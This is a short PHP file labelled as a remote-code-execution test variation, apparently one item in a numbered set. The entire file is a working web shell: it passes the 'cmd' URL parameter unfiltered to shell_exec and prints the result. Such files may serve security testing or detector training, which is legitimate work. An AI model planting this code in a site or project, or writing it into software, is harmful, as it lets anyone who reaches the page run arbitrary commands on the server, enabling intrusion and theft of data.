<?php
// RCE test variation #878
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>